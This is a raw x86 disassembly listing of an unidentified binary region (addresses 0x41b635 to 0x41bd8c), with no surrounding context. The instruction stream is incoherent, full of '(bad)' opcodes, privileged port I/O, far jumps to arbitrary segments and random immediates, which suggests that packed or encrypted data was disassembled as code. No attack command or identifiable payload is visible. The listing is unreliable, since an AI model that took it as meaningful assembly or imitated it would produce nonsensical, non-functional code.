  41b635:	mov    bh,0x2b
  41b637:	lods   al,BYTE PTR ds:[esi]
  41b638:	out    0xeb,al
  41b63a:	std    
  41b63b:	sbb    BYTE PTR [esi-0x76fa9c8c],dl
  41b641:	(bad)  
  41b642:	cmp    BYTE PTR [ecx+0x7a],bh
  41b645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b646:	xor    esp,DWORD PTR [eax+0x66]
  41b649:	fisttp DWORD PTR ds:0xcde5b2b3
  41b64f:	test   al,0x2c
  41b651:	bound  ebx,QWORD PTR [edx-0x26]
  41b654:	dec    edi
  41b655:	fsubr  st,st(6)
  41b657:	inc    esp
  41b658:	jno    0x41b6c3
  41b65a:	sub    eax,0x2381e7f
  41b65f:	push   ebx
  41b660:	xor    DWORD PTR gs:[edx],edx
  41b663:	inc    ecx
  41b664:	sub    ecx,DWORD PTR [esp+esi*4+0x75658c3b]
  41b66b:	sub    esp,DWORD PTR [edi+0x6a]
  41b66e:	pop    edi
  41b66f:	aam    0xac
  41b671:	cmp    eax,0xe952b99e
  41b676:	inc    DWORD PTR [edx]
  41b678:	rol    BYTE PTR [edx],0x1f
  41b67b:	jae    0x41b661
  41b67d:	mov    cl,BYTE PTR [ebp+0x5812be25]
  41b683:	or     DWORD PTR [ecx+0x543d63df],ebp
  41b689:	loop   0x41b6a0
  41b68b:	mov    ecx,0x8e1b68a8
  41b690:	jle    0x41b649
  41b692:	pop    ds
  41b693:	dec    ebp
  41b694:	or     DWORD PTR [edx+0x6d],edx
  41b697:	sahf   
  41b698:	cli    
  41b699:	fst    DWORD PTR [esi+0x5d]
  41b69c:	cli    
  41b69d:	das    
  41b69e:	pop    esi
  41b69f:	mov    bl,0xdb
  41b6a1:	sbb    esi,esi
  41b6a3:	mov    ds:0x8a9d2eb9,eax
  41b6a8:	sti    
  41b6a9:	test   BYTE PTR [edi-0x7ccebca1],0xca
  41b6b0:	pop    esi
  41b6b1:	mov    ecx,0x6d5cb4d
  41b6b6:	out    dx,al
  41b6b7:	mov    edi,0x252e531b
  41b6bc:	mov    ds:0x673a9f1c,al
  41b6c1:	xor    ch,BYTE PTR [esi]
  41b6c3:	lods   al,BYTE PTR ds:[esi]
  41b6c4:	cmp    dl,dh
  41b6c6:	sub    BYTE PTR [ebp+0x41b92e50],bh
  41b6cc:	xchg   ebp,eax
  41b6cd:	cmp    eax,0xc023ef54
  41b6d2:	jne    0x41b6a1
  41b6d4:	ret    
  41b6d5:	sub    bl,BYTE PTR ds:0x91a22864
  41b6db:	mov    ah,0x1c
  41b6dd:	daa    
  41b6de:	(bad)  
  41b6df:	int    0xca
  41b6e1:	sub    al,0x25
  41b6e3:	pop    esi
  41b6e4:	jge    0x41b6ef
  41b6e6:	inc    edi
  41b6e7:	mov    esp,0xeb0843c5
  41b6ec:	gs icebp 
  41b6ee:	pushf  
  41b6ef:	xchg   esi,eax
  41b6f0:	(bad)  
  41b6f1:	into   
  41b6f2:	mov    BYTE PTR [eax-0x3ff27365],al
  41b6f8:	mov    eax,ds:0x213e242e
  41b6fd:	and    bl,BYTE PTR [eax-0x4c4445c3]
  41b703:	xlat   BYTE PTR ds:[ebx]
  41b704:	push   es
  41b705:	xor    edi,DWORD PTR [edx+0x4f86bd56]
  41b70b:	fcomp  DWORD PTR [ebx-0x76]
  41b70e:	mov    eax,ds:0x45e2e551
  41b713:	pop    ebp
  41b714:	mov    DWORD PTR [ecx],ecx
  41b716:	pop    ebx
  41b717:	repz loop 0x41b77e
  41b71a:	retf   
  41b71b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b71c:	cwde   
  41b71d:	sub    al,0xff
  41b71f:	sbb    edi,DWORD PTR [ebp-0x1e83413a]
  41b725:	or     al,0x57
  41b727:	sbb    ecx,ebx
  41b729:	xor    bl,0x54
  41b72c:	rol    DWORD PTR [edi-0x13d05b67],1
  41b732:	imul   eax,DWORD PTR [edi-0x42d4b014],0x45
  41b739:	adc    ah,BYTE PTR [esi+0x18239de]
  41b73f:	cdq    
  41b740:	or     DWORD PTR [esi+0x5e],0x292777ec
  41b747:	xor    al,BYTE PTR ss:[edi+esi*8-0x3649ec2b]
  41b74f:	xchg   cl,bl
  41b751:	aad    0x63
  41b753:	jmp    0x41b6ee
  41b755:	out    dx,eax
  41b756:	repz and eax,0x29ea301b
  41b75c:	dec    esi
  41b75d:	adc    DWORD PTR [eax+0x51],edi
  41b760:	pop    ecx
  41b761:	mov    eax,ds:0x34d8624d
  41b766:	pop    ds
  41b767:	mov    ds:0x28203f28,eax
  41b76c:	dec    edx
  41b76d:	shl    DWORD PTR [ebx-0x30],0xc5
  41b771:	outs   dx,BYTE PTR ds:[esi]
  41b772:	push   eax
  41b773:	shl    BYTE PTR [ebx-0x10e59d67],0x72
  41b77a:	shr    DWORD PTR [eax+eiz*2-0x19],cl
  41b77e:	gs push cs
  41b780:	addr16 sub al,0xc7
  41b783:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b785:	jle    0x41b75f
  41b787:	mov    DWORD PTR [edi+0x7a57d814],esi
  41b78d:	xor    edx,DWORD PTR [ecx]
  41b78f:	sub    eax,0x814a32ad
  41b794:	push   ebx
  41b795:	ret    
  41b796:	aaa    
  41b797:	mov    al,ah
  41b799:	dec    edi
  41b79a:	ret    0x3d23
  41b79d:	frstor [ebx+0x5d]
  41b7a0:	test   DWORD PTR [esi-0x13],edi
  41b7a3:	xchg   edi,eax
  41b7a4:	test   eax,0x82bd9e54
  41b7a9:	push   cs
  41b7aa:	pop    esp
  41b7ab:	fimul  WORD PTR ds:0x838b8be2
  41b7b1:	adc    ebp,ebp
  41b7b3:	lahf   
  41b7b4:	push   0x5a3e86c0
  41b7b9:	jmp    0x41b77d
  41b7bb:	repnz loop 0x41b779
  41b7be:	int    0x82
  41b7c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7c1:	es ret 0x45f9
  41b7c5:	das    
  41b7c6:	or     al,0xec
  41b7c8:	aam    0xfc
  41b7ca:	and    al,0x17
  41b7cc:	and    al,0x1d
  41b7ce:	loop   0x41b7d7
  41b7d0:	dec    ebx
  41b7d1:	push   eax
  41b7d2:	push   esi
  41b7d3:	add    al,0xea
  41b7d5:	push   esp
  41b7d6:	retf   
  41b7d7:	inc    BYTE PTR [edi]
  41b7d9:	mov    ch,0xdf
  41b7db:	test   al,0x4b
  41b7dd:	push   sp
  41b7df:	xor    bl,bl
  41b7e1:	ins    BYTE PTR es:[edi],dx
  41b7e2:	mov    DWORD PTR [esi+ecx*4],esp
  41b7e5:	push   ds
  41b7e6:	iret   
  41b7e7:	sahf   
  41b7e8:	lock jp 0x41b774
  41b7eb:	push   esp
  41b7ec:	cmc    
  41b7ed:	pop    ebp
  41b7ee:	mov    BYTE PTR [edi+esi*2+0x2b5a1d92],dh
  41b7f5:	cmp    eax,0xdf7e0a38
  41b7fa:	mov    ebx,0xb47c898f
  41b7ff:	popa   
  41b800:	cmp    esi,DWORD PTR [esi-0xb]
  41b803:	xor    al,0x68
  41b805:	mov    al,0xf9
  41b807:	xchg   ebp,eax
  41b808:	test   al,0x53
  41b80a:	iret   
  41b80b:	dec    esi
  41b80c:	fcom   QWORD PTR [ebp+0x3236dcfc]
  41b812:	jne    0x41b871
  41b814:	push   ebx
  41b815:	jbe    0x41b825
  41b817:	lods   eax,DWORD PTR ds:[esi]
  41b818:	(bad)  
  41b819:	rcl    DWORD PTR [eax+0x4040f990],cl
  41b81f:	scas   al,BYTE PTR es:[edi]
  41b820:	jecxz  0x41b821
  41b822:	fdivr  DWORD PTR [ecx-0x70]
  41b825:	call   0x87ab0f57
  41b82a:	xor    al,0x95
  41b82c:	aas    
  41b82d:	adc    al,0x11
  41b82f:	jmp    0x94d7591d
  41b834:	cdq    
  41b835:	scas   eax,DWORD PTR es:[edi]
  41b836:	add    ah,BYTE PTR [ebx-0x3b]
  41b839:	pop    eax
  41b83a:	int    0x14
  41b83c:	(bad)  
  41b83d:	jo     0x41b885
  41b83f:	lock or BYTE PTR [ebx*8+0x1da743f5],0x86
  41b848:	lock adc al,0x1f
  41b84b:	(bad)  
  41b84c:	mov    ch,0xff
  41b84e:	(bad)  
  41b84f:	es icebp 
  41b851:	xchg   edi,eax
  41b852:	cmp    esp,esp
  41b854:	fadd   QWORD PTR [edx+0x8ba5733]
  41b85a:	outs   dx,BYTE PTR ds:[esi]
  41b85b:	outs   dx,BYTE PTR ds:[esi]
  41b85c:	ins    DWORD PTR es:[edi],dx
  41b85d:	mov    eax,0xb6df64c5
  41b862:	lock in al,0x17
  41b865:	xor    DWORD PTR [ecx-0x5e],edx
  41b868:	add    edx,eax
  41b86a:	mov    bl,0xc9
  41b86c:	ret    
  41b86d:	xlat   BYTE PTR ds:[ebx]
  41b86e:	test   BYTE PTR [ecx],bl
  41b870:	adc    bh,BYTE PTR [esi]
  41b872:	icebp  
  41b873:	mov    eax,0x98bb691
  41b878:	aad    0x7a
  41b87a:	sub    eax,0x63f4dc9d
  41b87f:	add    DWORD PTR [ebp+0x1a],0x3f
  41b883:	(bad)  
  41b884:	jmp    0x41b8d2
  41b886:	push   ebp
  41b887:	sbb    edi,DWORD PTR [ebx+ebx*8+0x58da95b5]
  41b88e:	xor    esp,ecx
  41b890:	arpl   WORD PTR [ecx+0x15],di
  41b893:	ins    BYTE PTR es:[edi],dx
  41b894:	sbb    DWORD PTR [ebx-0x22880cee],eax
  41b89a:	pop    ds
  41b89b:	mov    ch,0x87
  41b89d:	into   
  41b89e:	jns    0x41b8b6
  41b8a0:	(bad)  [ecx-0x21]
  41b8a3:	jno    0x41b86c
  41b8a5:	pop    ebp
  41b8a6:	xor    bh,BYTE PTR [eax]
  41b8a8:	dec    eax
  41b8a9:	jmp    0xe73e:0x642c576
  41b8b0:	outs   dx,DWORD PTR ds:[esi]
  41b8b1:	fldcw  WORD PTR [ebx-0xec7160]
  41b8b7:	xstore-rng (bad)
  41b8b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8b9:	inc    edx
  41b8ba:	inc    ecx
  41b8bb:	sub    ah,BYTE PTR [edx-0x134f9bcf]
  41b8c1:	sub    al,0xc
  41b8c3:	enter  0xc4a0,0x13
  41b8c7:	mov    edi,0xd3d8f3bd
  41b8cc:	jmp    0xb33d:0xca120373
  41b8d3:	xchg   esp,eax
  41b8d4:	push   esi
  41b8d5:	js     0x41b8b1
  41b8d7:	std    
  41b8d8:	sub    DWORD PTR [ebp-0x46],esp
  41b8db:	pop    es
  41b8dc:	mov    ds:0x13d09f2f,al
  41b8e1:	popf   
  41b8e2:	iret   
  41b8e3:	pop    esi
  41b8e4:	xchg   edx,eax
  41b8e5:	retf   0x71ff
  41b8e8:	pop    ss
  41b8e9:	fs es mov bh,0xe4
  41b8ed:	inc    ebx
  41b8ee:	xlat   BYTE PTR ds:[ebx]
  41b8ef:	jae    0x41b8c8
  41b8f1:	mov    esi,0xe1cac93d
  41b8f6:	(bad)  [esi+eax*8]
  41b8f9:	adc    cl,al
  41b8fb:	out    dx,eax
  41b8fc:	fcomp  DWORD PTR [edx-0x68]
  41b8ff:	jg     0x41b8fe
  41b901:	test   bl,al
  41b903:	push   esp
  41b904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b905:	scas   eax,DWORD PTR es:[edi]
  41b906:	push   esp
  41b907:	fild   DWORD PTR [esi+0x7a6f6e42]
  41b90d:	add    bh,dl
  41b90f:	int3   
  41b910:	mov    esi,0x6eae86c3
  41b915:	icebp  
  41b916:	stos   DWORD PTR es:[edi],eax
  41b917:	xchg   ebp,eax
  41b918:	mov    al,ds:0x28049a26
  41b91d:	cmp    al,0x2
  41b91f:	push   ebx
  41b920:	push   ds
  41b921:	and    eax,0x7a972d14
  41b926:	test   eax,0x130b8ef0
  41b92b:	mov    ebp,0x9a5fc424
  41b930:	adc    edx,DWORD PTR [eax+0xb]
  41b933:	les    ebp,FWORD PTR [esi+0x7198cb4d]
  41b939:	cdq    
  41b93a:	shl    DWORD PTR [esi],0xf3
  41b93d:	or     eax,0x3ced8858
  41b942:	ins    BYTE PTR es:[edi],dx
  41b943:	dec    edi
  41b944:	clc    
  41b945:	mov    ah,0x5d
  41b947:	mov    cl,0xe3
  41b949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b94a:	inc    ebx
  41b94b:	lods   al,BYTE PTR ds:[esi]
  41b94c:	pop    esi
  41b94d:	div    dh
  41b94f:	adc    edx,ecx
  41b951:	lds    ebx,FWORD PTR [edi+0x34]
  41b954:	std    
  41b955:	imul   esi,DWORD PTR [ebp-0x24],0xffffffd7
  41b959:	pop    edx
  41b95a:	lods   eax,DWORD PTR ds:[esi]
  41b95b:	pop    ss
  41b95c:	jge    0x41b9bf
  41b95e:	pop    ebx
  41b95f:	xchg   edi,eax
  41b960:	pop    es
  41b961:	pop    ss
  41b962:	push   eax
  41b963:	mov    BYTE PTR [esi],ah
  41b965:	jmp    0xc163:0xfc35e0e
  41b96c:	jb     0x41b98a
  41b96e:	mov    bl,0xcc
  41b970:	mov    esi,0x150070a6
  41b975:	xchg   al,dh
  41b977:	xchg   BYTE PTR [ebx-0x13f26aeb],bh
  41b97d:	mov    al,ds:0x4bc5ff86
  41b982:	std    
  41b983:	rcl    BYTE PTR [esi],cl
  41b985:	fcomip st,st(7)
  41b987:	adc    DWORD PTR [ebx+edx*1-0xe712b48],ebp
  41b98e:	in     al,dx
  41b98f:	popf   
  41b990:	add    al,0xd0
  41b992:	and    BYTE PTR [ecx-0x6e],ch
  41b995:	inc    DWORD PTR [ebx]
  41b997:	mov    ch,0xd2
  41b999:	aam    0xd
  41b99b:	lock and eax,0xb87c8ee
  41b9a1:	adc    eax,0xdafea7d7
  41b9a6:	push   ebp
  41b9a7:	or     bl,BYTE PTR [esi]
  41b9a9:	retf   0x728f
  41b9ac:	push   edi
  41b9ad:	or     bh,bh
  41b9af:	cmc    
  41b9b0:	retf   
  41b9b1:	repz gs lock iret 
  41b9b5:	inc    ebx
  41b9b6:	sar    BYTE PTR [ebx+0x7c273603],cl
  41b9bc:	xchg   esp,eax
  41b9bd:	(bad)  
  41b9be:	mov    ebx,0x46259153
  41b9c3:	dec    ecx
  41b9c4:	shl    DWORD PTR [eax],cl
  41b9c6:	and    edx,edx
  41b9c8:	fimul  DWORD PTR [eax-0x19]
  41b9cb:	push   cs
  41b9cc:	push   edx
  41b9cd:	jp     0x41b9d5
  41b9cf:	xchg   ebp,eax
  41b9d0:	inc    esi
  41b9d1:	bound  ecx,QWORD PTR [edi+0x2d]
  41b9d4:	pop    ecx
  41b9d5:	arpl   WORD PTR [edx-0x76706a28],sp
  41b9db:	out    dx,al
  41b9dc:	das    
  41b9dd:	pop    edx
  41b9de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9df:	aam    0xa3
  41b9e1:	cld    
  41b9e2:	not    BYTE PTR [edx-0x7e8e3995]
  41b9e8:	pop    esp
  41b9e9:	lea    edi,[esi-0x31ab92dd]
  41b9ef:	sbb    dl,al
  41b9f1:	ds in  al,dx
  41b9f3:	inc    eax
  41b9f4:	add    BYTE PTR [edx+0x27],cl
  41b9f7:	mov    fs,edx
  41b9f9:	ds ds pop ss
  41b9fc:	and    eax,0xee41bfc
  41ba01:	pop    eax
  41ba02:	hlt    
  41ba03:	inc    edx
  41ba04:	addr16 (bad) 
  41ba06:	shl    DWORD PTR es:[ebx+0x14589271],0xaf
  41ba0e:	iret   
  41ba0f:	pop    ss
  41ba10:	in     eax,0x85
  41ba12:	shl    BYTE PTR [ecx+0x3f],0xda
  41ba16:	test   eax,0x33a71346
  41ba1b:	(bad)  
  41ba1c:	retf   0x820e
  41ba1f:	dec    eax
  41ba20:	les    esi,FWORD PTR [edx+0x3da6ae32]
  41ba26:	mov    BYTE PTR [ebp+0x54],cl
  41ba29:	pop    ebp
  41ba2a:	retf   0xc660
  41ba2d:	loopne 0x41ba6a
  41ba2f:	pushf  
  41ba30:	sahf   
  41ba31:	(bad)  
  41ba32:	ins    BYTE PTR es:[edi],dx
  41ba33:	mov    bh,0x7a
  41ba35:	in     al,0x6a
  41ba37:	inc    esp
  41ba38:	loopne 0x41ba4f
  41ba3a:	dec    BYTE PTR [esi+0x24]
  41ba3d:	aam    0x6d
  41ba3f:	(bad)  
  41ba40:	cdq    
  41ba41:	mov    eax,ds:0x25213330
  41ba46:	into   
  41ba47:	mov    ecx,0xf251fc03
  41ba4c:	inc    esi
  41ba4d:	mov    esi,0x29bc5b2f
  41ba52:	xlat   BYTE PTR ds:[ebx]
  41ba53:	add    al,0x35
  41ba55:	adc    al,dh
  41ba57:	xchg   ecx,eax
  41ba58:	jmp    0x41bab6
  41ba5a:	sar    BYTE PTR [ecx],0xd2
  41ba5d:	sbb    al,0xe2
  41ba5f:	mov    al,ds:0x1d475e64
  41ba64:	pop    es
  41ba65:	aam    0x66
  41ba67:	loope  0x41ba7c
  41ba69:	hlt    
  41ba6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba6b:	jmp    0x65cf:0x521606ea
  41ba72:	into   
  41ba73:	inc    ebx
  41ba74:	xlat   BYTE PTR ds:[ebx]
  41ba75:	pop    eax
  41ba76:	pop    ds
  41ba77:	pushf  
  41ba78:	sub    ebp,DWORD PTR [esi-0x4106b562]
  41ba7e:	lahf   
  41ba7f:	push   edx
  41ba80:	jecxz  0x41ba49
  41ba82:	mov    ds:0x5ebb3127,eax
  41ba87:	xor    DWORD PTR ds:0x39b1316e,edi
  41ba8d:	jle    0x41ba39
  41ba8f:	xchg   DWORD PTR [edx-0x9000759],ebp
  41ba95:	test   eax,0x9ef9d227
  41ba9a:	shl    DWORD PTR [esi],0x30
  41ba9d:	jl     0x41bb00
  41ba9f:	add    BYTE PTR [eax+0x1b],ch
  41baa2:	daa    
  41baa3:	data16 jl 0x41ba56
  41baa6:	out    0x8,al
  41baa8:	xor    BYTE PTR [ebx-0x2d],dh
  41baab:	in     al,dx
  41baac:	mov    eax,0xbb394f0
  41bab1:	mov    esi,0x453a9585
  41bab6:	inc    DWORD PTR [eax]
  41bab8:	adc    ch,BYTE PTR [ecx+eiz*1-0x42]
  41babc:	dec    edx
  41babd:	push   eax
  41babe:	ja     0x41ba5c
  41bac0:	repnz inc esp
  41bac2:	stos   BYTE PTR es:[edi],al
  41bac3:	dec    ecx
  41bac4:	in     eax,0x81
  41bac6:	(bad)  
  41bac7:	retf   
  41bac8:	jns    0x41bab6
  41baca:	in     al,0x98
  41bacc:	rcl    BYTE PTR [ecx],0x53
  41bacf:	cmp    cl,cl
  41bad1:	loopne 0x41baaa
  41bad3:	inc    esi
  41bad4:	mov    ds:0xeca8c75f,al
  41bad9:	leave  
  41bada:	pop    edi
  41badb:	sub    dl,BYTE PTR ds:[ecx+0x37]
  41badf:	mov    edx,DWORD PTR [edx-0x7]
  41bae2:	mov    eax,0x6ce7931d
  41bae7:	and    al,bl
  41bae9:	(bad)  
  41baea:	fstp   QWORD PTR [ebp-0xfaabb29]
  41baf0:	mov    edx,0x4d140325
  41baf5:	loopne 0x41bb5a
  41baf7:	sub    al,0x38
  41baf9:	sbb    dl,BYTE PTR [esi+0x62be1773]
  41baff:	int3   
  41bb00:	add    eax,DWORD PTR [ebx-0x63]
  41bb03:	xchg   ebx,eax
  41bb04:	mov    ah,0xef
  41bb06:	pop    esi
  41bb07:	sub    eax,DWORD PTR [eax+0x4fdd6e17]
  41bb0d:	mov    ebp,0x8ab9c56b
  41bb12:	mov    ebp,DWORD PTR [edi]
  41bb14:	jb     0x41bb25
  41bb16:	pop    ebp
  41bb17:	lods   al,BYTE PTR ds:[esi]
  41bb18:	sub    ebx,ebx
  41bb1a:	je     0x41bb6f
  41bb1c:	scas   eax,DWORD PTR es:[edi]
  41bb1d:	outs   dx,BYTE PTR ds:[esi]
  41bb1e:	or     ch,BYTE PTR [edx-0x679c0f2]
  41bb24:	je     0x41bac3
  41bb26:	nop
  41bb27:	test   DWORD PTR [esp+esi*2-0x55e74f46],esp
  41bb2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb2f:	pop    ds
  41bb30:	push   edi
  41bb31:	or     bh,BYTE PTR [ecx+0x519321f0]
  41bb37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb38:	adc    DWORD PTR [edi+0x6bf6fe64],ebp
  41bb3e:	ret    0x2bcb
  41bb41:	ret    
  41bb42:	dec    esp
  41bb43:	out    dx,eax
  41bb44:	or     al,0x6b
  41bb46:	pop    esp
  41bb47:	fwait
  41bb48:	scas   al,BYTE PTR es:[edi]
  41bb49:	mov    edi,0x57152372
  41bb4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb4f:	push   edi
  41bb50:	adc    eax,0xc4876a18
  41bb55:	mov    WORD PTR [edx+0x12],ds
  41bb58:	or     DWORD PTR [eax-0x59],esp
  41bb5b:	shl    BYTE PTR [esi+0x61],1
  41bb5e:	rol    BYTE PTR [ebx-0x6eb36f4e],1
  41bb64:	sbb    al,BYTE PTR [eax-0x2e]
  41bb67:	(bad)  
  41bb68:	pop    eax
  41bb69:	call   0x9dce5772
  41bb6e:	lock mov esp,0xe85471fd
  41bb74:	mov    ds:0x292ac129,al
  41bb79:	sti    
  41bb7a:	ja     0x41bb55
  41bb7c:	rcr    BYTE PTR [esi],0x25
  41bb7f:	loope  0x41bbd1
  41bb81:	mov    cl,0xba
  41bb83:	push   ecx
  41bb84:	and    eax,0xe17e2eab
  41bb89:	cmp    DWORD PTR [edx+0xd98430d],ebp
  41bb8f:	imul   BYTE PTR [ebx]
  41bb91:	adc    DWORD PTR [ebx+0x5a],edx
  41bb94:	aad    0x7c
  41bb96:	nop
  41bb97:	adc    bh,BYTE PTR [ebx-0x4d581d9f]
  41bb9d:	sub    esi,DWORD PTR [eax]
  41bb9f:	retf   
  41bba0:	cmc    
  41bba1:	sbb    bl,BYTE PTR ds:0xd811b52
  41bba7:	sbb    esi,DWORD PTR [ecx+0x61b321a9]
  41bbad:	pop    ebx
  41bbae:	or     al,0xeb
  41bbb0:	scas   eax,DWORD PTR es:[edi]
  41bbb1:	add    al,0x83
  41bbb3:	outs   dx,BYTE PTR ds:[esi]
  41bbb4:	push   eax
  41bbb5:	and    DWORD PTR [eax+edx*1+0x3c7fd660],0xffffff91
  41bbbd:	ins    DWORD PTR es:[edi],dx
  41bbbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbbf:	test   al,0xe7
  41bbc1:	or     al,0x7
  41bbc3:	(bad)  
  41bbc4:	(bad)  
  41bbc6:	bound  ebx,QWORD PTR [ebx]
  41bbc8:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41bbca:	aaa    
  41bbcb:	adc    bh,BYTE PTR [esi-0x5c63ad11]
  41bbd1:	test   al,0xe1
  41bbd4:	aaa    
  41bbd5:	cmp    al,0x23
  41bbd7:	dec    ecx
  41bbd8:	push   eax
  41bbd9:	and    DWORD PTR [edi-0x46],edi
  41bbdc:	in     eax,dx
  41bbdd:	pushf  
  41bbde:	std    
  41bbdf:	jp     0x41bbd1
  41bbe1:	ret    
  41bbe2:	and    BYTE PTR [edx+ecx*1-0x44],0x39
  41bbe7:	fsubp  st(0),st
  41bbe9:	shl    DWORD PTR [esi-0x7a],0x9e
  41bbed:	xchg   ebp,eax
  41bbee:	and    BYTE PTR [edx+0x65f77d80],dl
  41bbf4:	sub    al,0x35
  41bbf6:	xchg   esi,eax
  41bbf7:	(bad)  
  41bbf9:	xchg   DWORD PTR [eax],edi
  41bbfb:	(bad)  
  41bbfc:	dec    ebp
  41bbfd:	xchg   DWORD PTR [ecx],ebx
  41bbff:	pop    esi
  41bc00:	mov    BYTE PTR [ebx],ah
  41bc02:	test   al,0x80
  41bc04:	stos   BYTE PTR es:[edi],al
  41bc05:	adc    BYTE PTR [ebx+ebx*2+0x17],cl
  41bc09:	inc    edi
  41bc0a:	pusha  
  41bc0b:	verr   WORD PTR [edi-0x6d]
  41bc0f:	out    dx,al
  41bc10:	inc    eax
  41bc11:	mov    ds:0x9a60e7,al
  41bc16:	xlat   BYTE PTR ds:[ebx]
  41bc17:	retf   0xbde2
  41bc1a:	xor    al,0xb0
  41bc1c:	mov    DWORD PTR [ecx-0x56a4ec5b],0xca64c147
  41bc26:	jge    0x41bc8d
  41bc28:	adc    al,0xdb
  41bc2a:	cmp    al,0x17
  41bc2c:	add    al,0x81
  41bc2e:	pushf  
  41bc2f:	pop    esi
  41bc30:	je     0x41bbc5
  41bc32:	fmulp  st(0),st
  41bc34:	loop   0x41bcb0
  41bc36:	(bad)  
  41bc37:	shl    DWORD PTR [eax+0x1faee5f8],1
  41bc3d:	addr16 sbb eax,0x9346d050
  41bc43:	jg     0x41bc2e
  41bc45:	gs push ebp
  41bc47:	mov    ds:0x5e5b570e,al
  41bc4c:	lea    esi,[ebx]
  41bc4e:	or     al,0xc3
  41bc50:	pop    esp
  41bc51:	arpl   WORD PTR [ecx+0x29771dde],si
  41bc57:	ds loop 0x41bc11
  41bc5a:	cmp    DWORD PTR [esi+esi*4+0x19f365d],0x65d20126
  41bc65:	mov    ds:0xaa5ce8a4,al
  41bc6a:	dec    eax
  41bc6b:	push   ds
  41bc6c:	lods   al,BYTE PTR ds:[esi]
  41bc6d:	das    
  41bc6e:	enter  0x97ce,0xa3
  41bc72:	pop    ebx
  41bc73:	cmp    al,0x3f
  41bc75:	fist   DWORD PTR [edx-0x7b]
  41bc78:	inc    ebp
  41bc79:	sub    DWORD PTR ds:0xd20ace73,0x918e9936
  41bc83:	or     edx,DWORD PTR [ebx+0x33bb31f9]
  41bc89:	inc    ebp
  41bc8a:	sbb    eax,0x52b1bf28
  41bc8f:	mov    ch,0xe2
  41bc91:	in     al,dx
  41bc92:	mov    fs,edx
  41bc94:	imul   ebp,DWORD PTR [ebp-0x14],0x26b4ec12
  41bc9b:	(bad)  
  41bc9c:	int3   
  41bc9d:	fwait
  41bc9e:	test   al,0x32
  41bca1:	mov    esi,0x4ac1e745
  41bca6:	and    al,0x7b
  41bca8:	das    
  41bca9:	pushf  
  41bcaa:	push   edx
  41bcab:	xchg   BYTE PTR [edi+ebp*1+0x38],dl
  41bcaf:	loopne 0x41bd26
  41bcb1:	in     al,dx
  41bcb2:	jno    0x41bc41
  41bcb4:	sub    DWORD PTR [edx+0x2c],ebp
  41bcb7:	test   BYTE PTR [ecx+ebp*8],cl
  41bcba:	shl    BYTE PTR [ebp+edi*4-0x664dced6],cl
  41bcc1:	aaa    
  41bcc2:	retf   0x207c
  41bcc5:	fiadd  WORD PTR ds:0x16d28f55
  41bccb:	or     bh,BYTE PTR [ebx-0x79]
  41bcce:	pop    eax
  41bccf:	cmp    eax,0x3c307432
  41bcd4:	sbb    eax,0x2ca159dc
  41bcd9:	shl    dh,0x9f
  41bcdc:	add    dl,BYTE PTR [edi-0x2a4df0dd]
  41bce2:	and    BYTE PTR [ebx],cl
  41bce4:	xor    al,0xa2
  41bce6:	repz mov edi,0xb727331a
  41bcec:	dec    ebx
  41bced:	imul   ecx,esi,0xec03ca73
  41bcf3:	outs   dx,DWORD PTR ds:[esi]
  41bcf4:	gs pop ds
  41bcf6:	mov    bh,0xec
  41bcf8:	push   eax
  41bcf9:	add    BYTE PTR [eax+0x5694e732],0xad
  41bd00:	push   esp
  41bd01:	and    eax,0xb376da49
  41bd06:	icebp  
  41bd07:	pop    edi
  41bd08:	xchg   ebx,eax
  41bd09:	fnstenv [esi-0x650b0c10]
  41bd0f:	hlt    
  41bd10:	jmp    0x46c0:0xa87a1d33
  41bd17:	in     al,0xcb
  41bd19:	leave  
  41bd1a:	sbb    bh,bl
  41bd1c:	xlat   BYTE PTR ds:[ebx]
  41bd1d:	add    al,0x84
  41bd1f:	lods   eax,DWORD PTR ds:[esi]
  41bd20:	cmp    DWORD PTR [eax-0x44],ebp
  41bd23:	sti    
  41bd24:	inc    ebp
  41bd25:	jp     0x41bd6b
  41bd27:	fistp  QWORD PTR [ebx-0x55a28452]
  41bd2d:	pushf  
  41bd2e:	cmp    al,0x2e
  41bd30:	imul   dx,WORD PTR [ebx-0x48ab3b5a],0x1bc4
  41bd39:	aaa    
  41bd3a:	mov    eax,0xb81ac76f
  41bd3f:	mov    DWORD PTR [bp+si-0x55],0x6151635d
  41bd47:	scas   al,BYTE PTR es:[edi]
  41bd48:	in     eax,dx
  41bd49:	xor    al,0x99
  41bd4b:	mov    esi,DWORD PTR [edi-0x6bdfb0ab]
  41bd51:	jmp    0x41bceb
  41bd53:	(bad)  
  41bd54:	leave  
  41bd55:	jne    0x41bdc8
  41bd57:	or     eax,0x8f698a1d
  41bd5c:	dec    eax
  41bd5d:	retf   
  41bd5e:	xchg   edi,eax
  41bd5f:	stc    
  41bd60:	dec    eax
  41bd61:	mov    cl,0x14
  41bd63:	dec    edi
  41bd64:	xchg   esi,eax
  41bd65:	test   edx,esp
  41bd67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd68:	sbb    eax,0x33f3e0fa
  41bd6d:	push   ebx
  41bd6e:	adc    al,BYTE PTR [eax+0x3b0aeb72]
  41bd74:	int    0x2a
  41bd76:	mov    BYTE PTR [ecx+0x7b],ch
  41bd79:	or     BYTE PTR [edi+0x4885fc72],ah
  41bd7f:	push   es
  41bd80:	adc    BYTE PTR [ebx],al
  41bd82:	dec    ecx
  41bd83:	push   edi
  41bd84:	pushf  
  41bd85:	pop    ss
  41bd86:	pop    edi
  41bd87:	mov    BYTE PTR [eax],ch
  41bd89:	outs   dx,DWORD PTR ds:[esi]
  41bd8a:	nop
  41bd8b:	xchg   edi,eax
  41bd8c:	sahf   
